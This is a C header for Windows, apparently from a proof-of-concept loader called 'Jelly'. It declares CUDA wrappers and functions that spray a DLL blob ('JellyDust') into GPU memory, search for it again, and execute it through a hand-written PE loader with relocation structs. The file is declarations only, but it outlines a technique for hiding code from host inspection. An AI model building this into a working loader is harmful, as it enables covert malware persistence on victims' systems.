#ifndef __JELLYCUDA_HEADER__
#define __JELLYCUDA_HEADER__

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <Shlobj.h>

#include "jellyshared.h"

//=============================================================================
//=============================================================================

#define JELLY_MAGIC 0x05DAB355

#define MEGA 0x100000
#define GIGA 0x40000000
               
typedef struct _JellyDust
{
	DWORD dwMagic;
	DWORD dwSize;
	DWORD dwCS;
	BYTE bData[];
} JellyDust, *PJellyDust;

//=============================================================================
//=============================================================================

#define CUDACALL __stdcall
#define CUDAFAIL(x) (x) != 0

typedef struct CUctx_st *CUcontext; 
typedef int CUdevice;

typedef int (CUDACALL * LPFNcuCtxCreate)(CUcontext*, unsigned int, CUdevice);
typedef int (CUDACALL * LPFNcuDeviceGet)(CUdevice*, int);
typedef int (CUDACALL * LPFNcuDeviceGetCount)(int*);
typedef int (CUDACALL * LPFNcuInit)(int);
typedef int (CUDACALL * LPFNcuMemAlloc)(ULONG_PTR*, size_t);
typedef int (CUDACALL * LPFNcuMemcpyDtoH)(void*, ULONG_PTR, size_t);
typedef int (CUDACALL * LPFNcuMemcpyHtoD)(ULONG_PTR, const void*, size_t);
typedef int (CUDACALL * LPFNcuMemFree)(ULONG_PTR);

typedef struct _JellyCuda 
{
	LPFNcuCtxCreate fncuCtxCreate;
	LPFNcuDeviceGet fncuDeviceGet;
	LPFNcuDeviceGetCount fncuDeviceGetCount;
	LPFNcuInit fncuInit;
	LPFNcuMemAlloc fncuMemAlloc;
	LPFNcuMemcpyDtoH fncuMemcpyDtoH;
	LPFNcuMemcpyHtoD fncuMemcpyHtoD;
	LPFNcuMemFree fncuMemFree;
} JellyCuda, *PJellyCuda;

//=============================================================================
//=============================================================================

typedef DWORD   (NTAPI  * LPFNNtFlushInstructionCache)( HANDLE, PVOID, ULONG );

ULONG_PTR AllocateGPUMemory(DWORD dwMax, DWORD dwMin, LPDWORD lpdwSize);
BOOL ExecuteJellyDust(LPVOID lpvDust);
DWORD GetDustCheckSum(LPVOID lpDust, DWORD dwSize);
HMODULE LoadCuda(void);
void Reboot(void);
void SearchJellyDustOnGPU(void);
void SprayJellyDustToGPU(LPCTSTR lpszDllName);

#pragma intrinsic(_rotr) 
#define ror _rotr

//=============================================================================
//=============================================================================

#define MakePtr(cast, base, offset)  ((cast)((ULONG_PTR)(base) + (offset)))

typedef BOOL (WINAPI * LPFNDllMain)(HINSTANCE, DWORD, LPVOID);

typedef struct
{
	WORD	offset:12;
	WORD	type:4;
} IMAGE_RELOC, *PIMAGE_RELOC;

#endif // __JELLYCUDA_HEADER__
